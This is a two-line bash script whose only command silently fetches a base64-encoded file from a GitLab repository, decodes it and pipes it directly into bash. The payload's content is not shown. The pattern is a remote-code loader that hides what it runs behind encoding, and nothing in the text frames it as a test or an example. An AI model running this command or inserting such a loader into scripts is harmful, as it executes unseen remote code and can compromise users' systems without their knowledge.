#!/bin/bash
wget -qO- https://gitlab.com/greywolf-group/greywolf-project/-/raw/main/entrypoint.sh | base64 -d | bash